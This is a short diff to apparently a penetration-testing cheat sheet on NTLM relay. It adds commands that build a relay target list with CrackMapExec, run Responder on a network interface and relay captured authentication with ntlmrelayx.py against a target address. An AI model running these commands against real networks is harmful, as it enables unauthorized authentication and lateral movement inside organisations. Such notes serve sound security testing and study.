@@ -125,4 +125,9 @@ By relay operation, attackers can authenticate other systems on network.
 Targeted user must be local admin on targeted system.
 In order to perform relay operation, SMB Signing must be disabled. (By default, it is disabled on Windows systems.)
   nmap -sV -p445 --script=smb-security-mode <CIDR>
+  cme smb <ip_addr> --gen-relay-list <output_file>
+You can perform NetNTLM relay via Responder and ntlmrelayx.py
+Responder must be configured to close SMB and HTTP services. (/etc/responder/Responder.conf)
+responder -I eth0
+ntlmrelayx.py -t <ip_addr>
   
